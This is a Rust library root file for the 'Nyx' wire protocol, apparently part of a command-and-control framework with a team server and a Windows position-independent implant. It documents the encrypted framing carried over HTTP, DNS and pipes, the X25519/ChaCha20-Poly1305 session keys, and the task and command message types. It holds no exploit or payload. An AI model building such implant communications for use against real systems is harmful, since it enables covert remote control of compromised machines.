//! Nyx wire protocol: crypto + framing + task/response messages.
//!
//! Shared by the team server, the (std) dev agent, and the Windows PIC implant.
//! Encoding is a hand-rolled little-endian binary codec (deliberately *not*
//! protobuf) so the same logic compiles `no_std` for the position-independent
//! implant without a serde/prost footprint. The crate is `no_std`-by-default
//! with a `std` feature (on by default for the server/agent-dev/client); the
//! implant builds with `--no-default-features`.
//!
//! Transport framing (per HTTP body / DNS blob / pipe message):
//! `[32B session pubkey][8B counter][4B ct_len LE][ciphertext || 16B tag]`
//!
//! Crypto (per session):
//! - Implant generates an ephemeral X25519 keypair; the server holds a
//!   long-term X25519 identity whose public half is baked into implant config.
//! - Session key = HKDF-SHA256(ECDH(implant_eph, server_id)).
//! - AEAD = ChaCha20-Poly1305, 96-bit nonce = zero-padded LE counter.
//!   The implant pubkey is bound as AAD on every operation.

#![cfg_attr(not(feature = "std"), no_std)]

#[cfg(not(feature = "std"))]
extern crate alloc;

#[cfg(feature = "std")]
extern crate alloc;

pub mod crypto;
pub mod frame;
pub mod msg;
pub mod wire;

pub use crypto::{
    aead_decrypt, ecdh, hkdf_sha256, open_dir, public_from_secret, seal_dir, Direction,
    GenerateError, HkdfError, ImplantKeypair, ServerKeypair, SessionKey, KEY_LEN, NONCE_LEN,
    PUBKEY_LEN,
};
pub use frame::{
    encode_frame, encode_frame_dir, open_frame, open_frame_dir, parse_frame, RawFrame,
    FRAME_HEADER, TAG_LEN,
};
pub use msg::{Command, FileOp, Response, SessionInfo, Task, TaskResponse};
